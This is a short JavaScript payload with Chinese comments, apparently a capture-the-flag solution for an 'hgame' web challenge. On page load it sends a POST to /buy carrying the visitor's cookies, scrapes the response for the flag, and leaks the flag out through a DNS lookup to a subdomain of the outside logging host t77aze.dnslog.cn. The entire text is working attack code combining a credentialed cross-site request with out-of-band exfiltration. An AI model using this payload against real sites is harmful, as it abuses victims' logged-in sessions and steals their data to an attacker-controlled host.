document.addEventListener('DOMContentLoaded', (event) => {
    // 假设已经通过某种方式登录，直接进行购买操作
    fetch("/buy", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ id: 0 }),
        credentials: 'include' // 确保携带cookie等身份凭证
    })
    .then(response => response.text())
    .then(data => {
        // 假设flag被回显在了页面的某个<p>标签中
        const parser = new DOMParser();
        const htmlDocument = parser.parseFromString(data, "text/html");
        const pElements = htmlDocument.getElementsByTagName("p");
        let flagContent = "";

        for (let p of pElements) {
            if (p.textContent.includes("hgame{")) {
                // 提取flag内容，并移除"hgame{}"
                flagContent = p.textContent.split("hgame{")[1].split("}")[0];
                break;
            }
        }

        if (flagContent) {
            // 构建目标URL并发送GET请求
            const targetUrl = `http://${flagContent}.t77aze.dnslog.cn`;
            fetch(targetUrl, { method: "GET" })
            .then(response => console.log("Flag sent successfully"))
            .catch(error => console.error("Error sending flag:", error));
        }
    })
    .catch(error => console.error("Error purchasing flag:", error));
});
